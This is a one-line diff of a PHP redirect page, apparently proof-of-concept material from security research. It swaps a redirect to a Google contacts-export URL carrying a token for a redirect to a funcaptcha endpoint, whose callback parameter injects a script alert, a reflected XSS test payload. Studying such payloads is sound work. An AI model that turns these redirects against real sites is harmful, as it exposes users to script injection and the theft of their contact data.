@@ -1,1 +1,1 @@
-<?php header('Location: https://www.google.com/s2/u/0/data/exportquery?ac=false&cids=1cb22c618b737cc7&cr=true&ct=true&ev=true&f=g2&gp=true&hl=en-US&id=personal&max=-1&nge=true&out=vcard&sf=display&sgids=6,d,e,f,17&st=0&tok=MnnPkmUBAAA.C5tUOFC3kJt7AmvGr9hL1w.lcIPYQXXQrTy6XsK2C7DZA&type=4'); ?> 
+<?php header('Location: http://funcaptcha.com/fc/a/?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E'); ?> 
